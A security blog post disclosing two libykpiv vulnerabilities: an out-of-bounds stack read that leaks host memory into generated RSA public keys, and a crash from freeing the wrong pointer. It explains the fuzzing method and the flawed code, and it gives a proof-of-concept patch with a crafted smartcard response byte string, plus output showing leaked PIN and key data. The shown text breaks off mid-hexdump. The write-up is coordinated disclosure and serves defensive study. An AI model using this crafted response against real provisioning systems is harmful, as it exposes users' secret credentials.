@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag -->
+<title>Yubico libykpiv Vulnerabilities | invd blog</title>
+<meta name="generator" content="Jekyll" />
+<meta property="og:title" content="Yubico libykpiv Vulnerabilities" />
+<meta name="author" content="Christian Reitter" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In April, I analyzed two Yubico C smartcard libraries using libFuzzer. During this process, I found two vulnerabilities in libykpiv plus a few minor other security problems and a number of generic bugs. Essentially, a malicious PIV (FIPS 201) smartcard can cause two sorts of issues during the host-initiated private RSA key generation, namely an out of bounds read on the host library stack (CVE-2020-13131) and a denial of service (CVE-2020-13132). Under some conditions, host process memory is copied into a corrupted RSA public key and returned by the library to the caller. The potential to obtain stack memory of the host via public keys is an unusual information leak." />
+<meta property="og:description" content="In April, I analyzed two Yubico C smartcard libraries using libFuzzer. During this process, I found two vulnerabilities in libykpiv plus a few minor other security problems and a number of generic bugs. Essentially, a malicious PIV (FIPS 201) smartcard can cause two sorts of issues during the host-initiated private RSA key generation, namely an out of bounds read on the host library stack (CVE-2020-13131) and a denial of service (CVE-2020-13132). Under some conditions, host process memory is copied into a corrupted RSA public key and returned by the library to the caller. The potential to obtain stack memory of the host via public keys is an unusual information leak." />
+<link rel="canonical" href="https://blog.inhq.net/posts/yubico-libykpiv-vuln/" />
+<meta property="og:url" content="https://blog.inhq.net/posts/yubico-libykpiv-vuln/" />
+<meta property="og:site_name" content="invd blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-07-08T19:45:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Yubico libykpiv Vulnerabilities" />
+<script type="application/ld+json">
+{"description":"In April, I analyzed two Yubico C smartcard libraries using libFuzzer. During this process, I found two vulnerabilities in libykpiv plus a few minor other security problems and a number of generic bugs. Essentially, a malicious PIV (FIPS 201) smartcard can cause two sorts of issues during the host-initiated private RSA key generation, namely an out of bounds read on the host library stack (CVE-2020-13131) and a denial of service (CVE-2020-13132). Under some conditions, host process memory is copied into a corrupted RSA public key and returned by the library to the caller. The potential to obtain stack memory of the host via public keys is an unusual information leak.","@type":"BlogPosting","datePublished":"2020-07-08T19:45:00+02:00","url":"https://blog.inhq.net/posts/yubico-libykpiv-vuln/","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.inhq.net/posts/yubico-libykpiv-vuln/"},"author":{"@type":"Person","name":"Christian Reitter"},"headline":"Yubico libykpiv Vulnerabilities","dateModified":"2020-07-08T19:45:00+02:00","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://blog.inhq.net/feed.xml" title="invd blog" /><script type="text/javascript">
+  var _paq = window._paq || [];
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  _paq.push(['setSecureCookie', true]);
+  _paq.push(['setVisitorCookieTimeout', 60 * 60 * 24 * 90]);
+  _paq.push(['setReferralCookieTimeout', 60 * 60 * 24 * 90]);
+  _paq.push(['appendToTrackingUrl', 'bots=1']);
+  (function() {
+    var u="https://mato.inhq.net/";
+    _paq.push(['setTrackerUrl', u+'m']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'mat.js'; s.parentNode.insertBefore(g,s);
+  })();
+  </script></head>
+<body><header class="site-header"><noscript><img src="https://mato.inhq.net/m?rec=1&bots=1&idsite=1" alt="" style="position:absolute; visibility:hidden" /></noscript><div class="wrapper"><a class="site-title" rel="author" href="/">invd blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger">
+        <a class="page-link" href="/archive/">Archive</a><a class="page-link" href="/cve/">CVEs</a><a class="page-link" href="/consulting/">Consulting</a><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Yubico libykpiv Vulnerabilities</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2020-07-08T19:45:00+02:00" itemprop="datePublished">
+        Jul 8, 2020
+      </time>• <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+            <span class="p-author h-card" itemprop="name">Christian Reitter</span></span><br/>ID:
+        
+          
+          <span>CVE-2020-13131</span>,
+          
+          <span>CVE-2020-13132</span>
+        <br/>
+      Related articles:
+      <a href="/posts/yubico-libyubihsm-vuln2/">Yubico libyubihsm Vulnerabilities (CVE-2021-27217, CVE-2021-32489)</a>
+          • <a href="/posts/yubico-libyubihsm-vuln/">Yubico libyubihsm Vulnerabilities</a>
+          • <a href="/posts/yubico-libu2f-host-vuln-part2/">Yubico libu2f-host Vulnerability - Part Two</a>
+          </p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>In April, I analyzed two Yubico C smartcard libraries using libFuzzer.<br />
+During this process, I found two vulnerabilities in <a href="https://developers.yubico.com/yubico-piv-tool/">libykpiv</a> plus a few minor other security problems and a number of generic bugs.
+Essentially, a malicious <a href="https://developers.yubico.com/PIV/">PIV</a> (FIPS 201) smartcard can cause two sorts of issues during the host-initiated private RSA key generation, namely an <strong>out of bounds read</strong> on the host library stack (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13131">CVE-2020-13131</a>) and a <strong>denial of service</strong> (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13132">CVE-2020-13132</a>). Under some conditions, host process memory is copied into a corrupted RSA public key and returned by the library to the caller. The potential to obtain stack memory of the host via public keys is an unusual information leak.</p>
+
+<p>The following article will describe the issues and how they were found.</p>
+
+<div id="toc-container">
+  <h2 class="no_toc">Contents</h2>
+<ul id="markdown-toc">
+  <li><a href="#consulting" id="markdown-toc-consulting">Consulting</a></li>
+  <li><a href="#fuzzing-methodology" id="markdown-toc-fuzzing-methodology">Fuzzing Methodology</a></li>
+  <li><a href="#the-vulnerabilities" id="markdown-toc-the-vulnerabilities">The Vulnerabilities</a>    <ul>
+      <li><a href="#out-of-bounds-read---cve-2020-13131" id="markdown-toc-out-of-bounds-read---cve-2020-13131">Out of Bounds Read - CVE-2020-13131</a></li>
+      <li><a href="#denial-of-service----cve-2020-13132" id="markdown-toc-denial-of-service----cve-2020-13132">Denial of Service  - CVE-2020-13132</a></li>
+      <li><a href="#attack-scenario-and-security-implications" id="markdown-toc-attack-scenario-and-security-implications">Attack Scenario and Security Implications</a></li>
+      <li><a href="#proof-of-concept" id="markdown-toc-proof-of-concept">Proof Of Concept</a></li>
+    </ul>
+  </li>
+  <li><a href="#note-on-older-cryptography-standards" id="markdown-toc-note-on-older-cryptography-standards">Note on Older Cryptography Standards</a></li>
+  <li><a href="#thoughts-on-this-attack-class" id="markdown-toc-thoughts-on-this-attack-class">Thoughts on This Attack Class</a></li>
+  <li><a href="#coordinated-disclosure" id="markdown-toc-coordinated-disclosure">Coordinated Disclosure</a>    <ul>
+      <li><a href="#relevant-yubico-piv-tool--libykpiv-sources" id="markdown-toc-relevant-yubico-piv-tool--libykpiv-sources">Relevant yubico-piv-tool / libykpiv Sources</a></li>
+      <li><a href="#other-relevant-software" id="markdown-toc-other-relevant-software">Other Relevant Software</a></li>
+      <li><a href="#detailed-timeline" id="markdown-toc-detailed-timeline">Detailed Timeline</a></li>
+      <li><a href="#bug-bounty" id="markdown-toc-bug-bounty">Bug Bounty</a></li>
+    </ul>
+  </li>
+</ul>
+
+</div>
+
+<h2 id="consulting">Consulting</h2>
+
+<p><i>I’m a freelance Security Consultant and currently available for new projects.
+  If you are looking for assistance to secure your projects or organization, <a href="/consulting">get in touch</a>.</i></p>
+
+<h2 id="fuzzing-methodology">Fuzzing Methodology</h2>
+
+<p>First, some background information on the automated error-finding approach and related challenges.</p>
+
+<p>The libykpiv library source repository also contains the yubico-piv-tool CLI, which uses the library to provide a number of management functions of PIV smartcards and is the official tool to manage some PIV aspects of Yubikey devices. I decided to fuzz the library through this tool.
+Broadly speaking, I replaced parts of the yubico-piv-tool programming so that libFuzzer is in control over all relevant data inputs. To achieve this, the command line parameters (<em>argv</em>), the smartcard responses (<em>pcsc-lite backend</em>) and the <code class="language-plaintext highlighter-rouge">stdin</code>-based interactive user inputs are (mostly) fed with fuzzer-controlled data. To explain this on a higher level: libFuzzer “decides” which PIV management operations are called, which data the user feeds in and how the virtual smartcard reacts to them. As a result, the fuzzer can test a broad range of states within the program for crashes and runtime errors without requiring purposefully written code for each management operation. As it is common during fuzzing, the AddressSanitizer, UndefinedBehaviorSanitizer and MemorySanitizer modules are used in varying configurations to provide enhanced error detection.</p>
+
+<p>This fuzzing setup required several code iterations to work well and still progresses a lot slower when compared to targeted function-level fuzzing. However, it has the major advantage of staying close to the real-world code behavior (-&gt; <em>tests everything that is reachable through <code class="language-plaintext highlighter-rouge">main()</code> of the CLI tool</em>) while automatically looking for problematic edge cases without extensive manual intervention. For example, the fuzzer will try to find and use undocumented command line flags and flag combinations, but will not call library functions in ways that are unreachable in the normal program. In general, this approach is complex and not suited for every target, but it can save a lot of work when compared to building and managing a dozen narrow, specialized fuzzer harnesses for individual functions. This is particularly useful during explorative work on a foreign codebase, as it was the case here. It might not be suited very well if you’re going for unit-test like coverage of each function.</p>
+
+<p>To help the fuzzer exploration, I manually collected some interesting command line flag snippets in a <a href="https://llvm.org/docs/LibFuzzer.html#dictionaries">dictionary file</a>.</p>
+
+<p>As usual, there are a number of general code changes that one has to perform on a program before it is usable with libFuzzer. In particular, the resulting binary</p>
+<ul>
+  <li>should not have side effects between individual runs (<em>this involves resetting certain variables</em>)</li>
+  <li>should not exhibit general stability issues during runtime (<em>file writes, resource leaks, ..</em>)</li>
+  <li>each individual program run should be fast (<em>no blocking input  or sleep operations</em>)</li>
+</ul>
+
+<p>For yubico-piv-tool, this meant finding and fixing <a href="https://github.com/Yubico/yubico-piv-tool/issues?q=is%3Aissue+is%3Aclosed+author%3Ainvd">a number of bugs</a> so that stable fuzzing operations ran longer than a few minutes. There are still some remaining memory leaks in the codebase, particularly in the OpenSSL handling, but I’m optimistic that Yubico developers will fix those in the next 1-2 releases.</p>
+
+<h2 id="the-vulnerabilities">The Vulnerabilities</h2>
+
+<h3 id="out-of-bounds-read---cve-2020-13131">Out of Bounds Read - CVE-2020-13131</h3>
+<p>The <code class="language-plaintext highlighter-rouge">ykpiv_util_generate_key()</code> function in the libykpiv host-side library is designed to trigger a private key generation within the PIV smartcard and return the corresponding public key that is parsed from the smartcard response.</p>
+
+<p>Note: a number of USB hardware tokens such as the Yubikey 5 series also act as the PIV smartcard &amp; reader, so this applies to them as well if the affected functionality is used.</p>
+
+<p>Relevant code paths:</p>
+
+<ul>
+  <li>RSA1024 / RSA2048: <strong>affected</strong></li>
+  <li>ECC P256 / ECC P384: not affected</li>
+</ul>
+
+<p><em>Interestingly, the RSA path of the key generation function has some extra handling logic due to the infamous <a href="https://en.wikipedia.org/wiki/ROCA_vulnerability">Return of Coppersmith’s attack</a> on RSA keys that was present in the firmware of older Yubikey 4 devices through a flaw in an Infineon cryptography library. This is not relevant for the attack that is discussed here, though.</em></p>
+
+<p>After checking the validity of some function parameters, <code class="language-plaintext highlighter-rouge">_ykpiv_transfer_data()</code> is called. This prompts the smartcard to actually <strong>generate</strong> the requested <strong>private key</strong> and store it internally in a specific key slot. If the operation is successful, the smartcard will return several data fields in its response that contain the corresponding <strong>public key</strong> in the form of the cryptographic key components.
+The smartcard response is temporarily stored in an <code class="language-plaintext highlighter-rouge">unsigned char data[1024]</code> message buffer on the host, which will become relevant later.</p>
+
+<p>Consider the following code section that parses the response for the RSA case:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">  <span class="k">if</span> <span class="p">((</span><span class="n">YKPIV_ALGO_RSA1024</span> <span class="o">==</span> <span class="n">algorithm</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">YKPIV_ALGO_RSA2048</span> <span class="o">==</span> <span class="n">algorithm</span><span class="p">))</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data_ptr</span> <span class="o">=</span> <span class="n">data</span> <span class="o">+</span> <span class="mi">5</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">data_ptr</span> <span class="o">!=</span> <span class="n">TAG_RSA_MODULUS</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">verbose</span><span class="p">)</span> <span class="p">{</span> <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to parse public key structure (modulus).</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> <span class="p">}</span>
+      <span class="n">res</span> <span class="o">=</span> <span class="n">YKPIV_PARSE_ERROR</span><span class="p">;</span>
+      <span class="k">goto</span> <span class="n">Cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">data_ptr</span><span class="o">++</span><span class="p">;</span>
+    <span class="n">data_ptr</span> <span class="o">+=</span> <span class="n">_ykpiv_get_length</span><span class="p">(</span><span class="n">data_ptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
+
+    <span class="n">cb_modulus</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="p">(</span><span class="n">ptr_modulus</span> <span class="o">=</span> <span class="n">_ykpiv_alloc</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">cb_modulus</span><span class="p">)))</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">verbose</span><span class="p">)</span> <span class="p">{</span> <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to allocate memory for modulus.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> <span class="p">}</span>
+      <span class="n">res</span> <span class="o">=</span> <span class="n">YKPIV_MEMORY_ERROR</span><span class="p">;</span>
+      <span class="k">goto</span> <span class="n">Cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">ptr_modulus</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">,</span> <span class="n">cb_modulus</span><span class="p">);</span></code></pre></figure>
+
+<p><a href="https://github.com/Yubico/yubico-piv-tool/blob/d5a78951119c94bf232472900be74fdc651eb36e/lib/util.c#L896-L916" class="highlightref">util.c</a></p>
+
+<p>The modulus field in the response has a variable length, therefore the <code class="language-plaintext highlighter-rouge">_ykpiv_get_length(data_ptr, &amp;len)</code> function is used to parse the relevant length field for a matching memory allocation. Unfortunately, the resulting length of <code class="language-plaintext highlighter-rouge">0 to 65535</code> in the variable <code class="language-plaintext highlighter-rouge">len</code> is then <strong>used without any bounds checks</strong> in the following memory operations, which represents the essential memory handling flaw of this vulnerability. The unchecked length field allows an attacker to significantly over-report the actual length of the provided data fields in the smartcard response and cause an <strong>out of bounds read</strong> on the host through the <code class="language-plaintext highlighter-rouge">memcpy()</code> operation that reads from the <code class="language-plaintext highlighter-rouge">data[1024]</code> buffer.</p>
+
+<p>As a consequence, uninitialized memory in <code class="language-plaintext highlighter-rouge">data</code> and up to ~64.5k bytes of stack memory behind <code class="language-plaintext highlighter-rouge">data</code> will be copied into the freshly allocated <code class="language-plaintext highlighter-rouge">ptr_modulus</code> buffer on the heap.
+This memory will only be returned to the caller if the key generation function completes <strong>without errors</strong>, so it is in the interest of the attacker to make that happen.</p>
+
+<p>The RSA handling of <code class="language-plaintext highlighter-rouge">ykpiv_util_generate_key()</code> contains two variable length fields: first the <strong>modulus</strong> (code shown above) and then the <strong>exponent</strong>.
+Due to the way that <code class="language-plaintext highlighter-rouge">data_ptr</code> is incremented, attacking the modulus field is problematic and fails with a high probability since a specific followup check against <code class="language-plaintext highlighter-rouge">*data_ptr</code> contents has to succeed despite pointing to stack memory that is not controlled by the attacker.</p>
+
+<p>The better approach for an attacker is to report a small length value on the <strong>modulus field</strong> and then over-report the length for the <strong>exponent field</strong> (<code class="language-plaintext highlighter-rouge">cb_exp</code>). The code for this second read operation is shown here:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="n">data_ptr</span> <span class="o">+=</span> <span class="n">_ykpiv_get_length</span><span class="p">(</span><span class="n">data_ptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
+
+    <span class="n">cb_exp</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="p">(</span><span class="n">ptr_exp</span> <span class="o">=</span> <span class="n">_ykpiv_alloc</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">cb_exp</span><span class="p">)))</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">verbose</span><span class="p">)</span> <span class="p">{</span> <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to allocate memory for public exponent.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> <span class="p">}</span>
+      <span class="n">res</span> <span class="o">=</span> <span class="n">YKPIV_MEMORY_ERROR</span><span class="p">;</span>
+      <span class="k">goto</span> <span class="n">Cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">ptr_exp</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">,</span> <span class="n">cb_exp</span><span class="p">);</span></code></pre></figure>
+
+<p><a href="https://github.com/Yubico/yubico-piv-tool/blob/d5a78951119c94bf232472900be74fdc651eb36e/lib/util.c#L927-L936" class="highlightref">util.c</a></p>
+
+<p>This attack vector is much more reliable since there is no following check on <code class="language-plaintext highlighter-rouge">*data_ptr</code> values after this copy operation. Once the function returns with the return code <code class="language-plaintext highlighter-rouge">YKPIV_OK</code>, it depends <strong>on the caller of the libykpiv library function</strong> how the large information leak in <code class="language-plaintext highlighter-rouge">*exp</code> and the large <code class="language-plaintext highlighter-rouge">*exp_len</code> length is handled.</p>
+
+<p>For the yubico-piv-tool CLI tool, the leaked data will be <strong>processed via OpenSSL</strong> bignum functions and copied as encoded ASN.1 binary data into the <strong>public key</strong> that is returned to the user (<em>via stdout or file write</em>).
+It is plausible that this local information leak can lead to further exposure of the relevant data since public keys are designed to be copied across trust boundaries.</p>
+
+<p>Other callers of libykpiv might reject the returned data due to the abnormal exponent length or unintentionally crash due to other memory issues.
+Note that depending on the size specified by the attacker via the over-reported length field, it is possible that libykpiv will crash with a segfault if the read operation goes beyond the available stack space.</p>
+
+<p>See the sections below for more thoughts on the practical impact.</p>
+
+<h3 id="denial-of-service----cve-2020-13132">Denial of Service  - CVE-2020-13132</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">ykpiv_util_generate_key()</code> function has a second problematic code path in the RSA1024 / RSA2048 key generation.</p>
+
+<p>In the cleanup section, <code class="language-plaintext highlighter-rouge">free()</code> is called on the wrong pointer if <code class="language-plaintext highlighter-rouge">ptr_modulus</code> is set:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="nl">Cleanup:</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">ptr_modulus</span><span class="p">)</span> <span class="p">{</span> <span class="n">_ykpiv_free</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">modulus</span><span class="p">);</span> <span class="p">}</span></code></pre></figure>
+
+<p><a href="https://github.com/Yubico/yubico-piv-tool/blob/d5a78951119c94bf232472900be74fdc651eb36e/lib/util.c#L991-L993" class="highlightref">util.c</a></p>
+
+<p>The program will crash with a deadly signal if this code is reached.</p>
+
+<p>Here is the verbose warning if the program is explicitly instrumented with the AddressSanitizer:</p>
+<blockquote>
+==20689==ERROR: AddressSanitizer: attempting free on address which was
+not malloc()-ed: 0x7ffc74123880 in thread T0
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">ptr_modulus</code> is usually <code class="language-plaintext highlighter-rouge">NULL</code> if there are obvious problems, and it is set back to <code class="language-plaintext highlighter-rouge">NULL</code> if the data parsing for the RSA case was successful.
+This explains why the problem was not detected during regular testing: the edge case is only reached if a (simulated) smartcard responds with <em>mostly</em> good data to pass some of the function checks.</p>
+
+<p>A malicious smartcard could do the following to trigger the issue during a key generation request:</p>
+<ol>
+  <li>report <code class="language-plaintext highlighter-rouge">SW_SUCCESS</code> on the data transfer and provide some response bytes</li>
+  <li>set <code class="language-plaintext highlighter-rouge">TAG_RSA_MODULUS</code> correctly</li>
+  <li>set a reasonable, small <code class="language-plaintext highlighter-rouge">cb_modulus</code> length (-&gt; for <code class="language-plaintext highlighter-rouge">ptr_modulus</code> allocation) and some dummy data for the modulus</li>
+  <li>set <code class="language-plaintext highlighter-rouge">TAG_RSA_EXP</code> <strong>incorrectly</strong> to trigger <code class="language-plaintext highlighter-rouge">goto Cleanup</code></li>
+  <li>-&gt; program crash</li>
+</ol>
+
+<p>Although it is present in the same code section, the crash is not directly an “insufficient length field validation” problem and distinct enough from the first issue to be treated separately.</p>
+
+<h3 id="attack-scenario-and-security-implications">Attack Scenario and Security Implications</h3>
+<p>As described in the previous sections, CVE-2020-13131 and CVE-2020-13132 are located in the <code class="language-plaintext highlighter-rouge">ykpiv_util_generate_key()</code> function of the host library. 
+They are exposed when libykpiv is used to request a new RSA private key generation from the smartcard.
+During this particular operation, a malicious device that is recognized as the target smartcard can trigger the out of bounds read on the stack or crash the process.</p>
+
+<p>Note that the vulnerabilities</p>
+<ul>
+  <li>are <strong>not reachable</strong> during regular PIV verification usage or other daily workflows that do not include key generation</li>
+  <li>will <strong>not be triggered</strong> by genuine smartcards (<em>unless there is some transmission error</em>)</li>
+  <li>are <strong>on the host side</strong> and <strong>do not affect</strong> the Yubikey device firmware code</li>
+</ul>
+
+<p>For the typical Linux user with a Yubikey on their keychain and the occasional use of <code class="language-plaintext highlighter-rouge">yubico-piv-tool</code> for device configuration, the practical security impact of these issues is fairly small. 
+The same is true for users on Windows and other operating systems, from what I can tell.</p>
+
+<p>If a particular public key generated via <code class="language-plaintext highlighter-rouge">yubico-piv-tool</code> is fully functional (<em>for example, successful login with your smartcard</em>) then it is unlikely to contain any leaked stack memory.</p>
+
+<p>The CVE issues are of concern to automated systems that use libykpiv to provision externally provided smartcards (<em>where a fake smartcard could be part of a batch of devices or physically plugged into the target machine</em>), particularly if those systems call the configuration tools with secret values (<em>management key, PIN, bash environment variables, other secret internal state</em>) and rely on uninterrupted operation or expose the resulting public key to some third party.
+I <strong>am not aware</strong> of any public product that does this. However, I would not be surprised if automated systems of this sort exist somewhere, perhaps in proprietary form, in order to provision or manage a collection of physical keys at some enterprise or institution that relies on PIV authentication.</p>
+
+<h4 id="cvss-score">CVSS Score</h4>
+<p>Yubico has evaluated both the <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:P/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N">first</a> and <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:P/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N">second</a> issue with a CVSSv3.1 score of 4.3.</p>
+
+<h3 id="proof-of-concept">Proof Of Concept</h3>
+
+<p>The following patch for libykpiv simulates a malicious smartcard response to trigger CVE-2020-13131. Use it together with your target program and a physical PIV token to test the practical impact.</p>
+
+<p><strong>WARNING: use the following code at your own risk. Assume that this will PERMANENTLY overwrite data on the dummy smartcard device that you use.</strong>
+<br /><br /></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">-</span>  <span class="k">if</span> <span class="p">(</span><span class="n">YKPIV_OK</span> <span class="o">!=</span> <span class="p">(</span><span class="n">res</span> <span class="o">=</span> <span class="n">_ykpiv_transfer_data</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">templ</span><span class="p">,</span> <span class="n">in_data</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="n">in_ptr</span> <span class="o">-</span> <span class="n">in_data</span><span class="p">),</span> <span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">recv_len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sw</span><span class="p">)))</span> <span class="p">{</span>
+<span class="o">+</span>  <span class="c1">// simulate malicious smartcard answer</span>
+<span class="o">+</span>  <span class="c1">// [0-4] dummy bytes</span>
+<span class="o">+</span>  <span class="c1">// [5] TAG_RSA_MODULUS</span>
+<span class="o">+</span>  <span class="c1">// [6] short length field</span>
+<span class="o">+</span>  <span class="c1">// [7] modulus data</span>
+<span class="o">+</span>  <span class="c1">// [8] TAG_RSA_EXP</span>
+<span class="o">+</span>  <span class="c1">// [9-12] length field - long form</span>
+<span class="o">+</span>  <span class="c1">// the length is given as \x20\x00 = 8192 bytes in this example</span>
+<span class="o">+</span>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">response</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x00\x00\x00\x00\x00\x81\x01\x00\x82\x82\x20\x00</span><span class="s">"</span><span class="p">;</span>
+<span class="o">+</span>  <span class="n">recv_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">response</span><span class="p">);</span>
+<span class="o">+</span>  <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">response</span><span class="p">,</span> <span class="n">recv_len</span><span class="p">);</span>
+<span class="o">+</span>  <span class="n">sw</span> <span class="o">=</span> <span class="n">SW_SUCCESS</span><span class="p">;</span>
+<span class="o">+</span>
+<span class="o">+</span>  <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">YKPIV_OK</span> <span class="o">!=</span> <span class="p">(</span><span class="n">res</span> <span class="o">=</span> <span class="n">_ykpiv_transfer_data</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">templ</span><span class="p">,</span> <span class="n">in_data</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="n">in_ptr</span> <span class="o">-</span> <span class="n">in_data</span><span class="p">),</span> <span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">recv_len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sw</span><span class="p">)))</span> <span class="p">{</span></code></pre></figure>
+
+<p><a href="https://github.com/Yubico/yubico-piv-tool/blob/d5a78951119c94bf232472900be74fdc651eb36e/lib/util.c#L858" class="highlightref">util.c</a></p>
+
+<p>Note that all other values for <code class="language-plaintext highlighter-rouge">response[8]</code> will trigger CVE-2020-13132 instead.</p>
+
+<h4 id="yubico-piv-tool-poc-behavior">yubico-piv-tool POC Behavior</h4>
+
+<pre><code class="language-C">./yubico-piv-tool -s9a -ARSA1024 -agenerate &gt; public_key_output
+
+cat public_key_output
+-----BEGIN PUBLIC KEY-----
+[ ... encoded memory data information leak ... ]
+-----END PUBLIC KEY---
+</code></pre>
+<p><br /></p>
+
+<p>The OpenSSL CLI tool can be used to decode the public key data and present it in a hexdump format:</p>
+<pre><code class="language-C">openssl asn1parse -in public_key_output -dump
+
+    0:d=0  hl=4 l=14611 cons: SEQUENCE
+    4:d=1  hl=2 l=  13 cons: SEQUENCE
+    6:d=2  hl=2 l=   9 prim: OBJECT            :rsaEncryption
+   17:d=2  hl=2 l=   0 prim: NULL
+   19:d=1  hl=4 l=14592 prim: BIT STRING
+      0000 - 00 30 82 38 fb 02 01 00-02 82 38 f4 00 f8 53 41   .0.8......8...SA
+      [ ... binary memory data information leak ... ]
+</code></pre>
+<p><br /></p>
+
+<p>During testing, it was possible to leak the exact command line parameter strings that the tool is called with, including the management key (<code class="language-plaintext highlighter-rouge">-k</code> parameter) and the PIN code (<code class="language-plaintext highlighter-rouge">-p</code> parameter):</p>
+<pre><code class="language-C">      2da0 - 69 63 6f 2d 70 69 76 2d-74 6f 6f 6c 2f 74 6f 6f   ico-piv-tool/too
+      2db0 - 6c 2f 2e 6c 69 62 73 2f-79 75 62 69 63 6f 2d 70   l/.libs/yubico-p
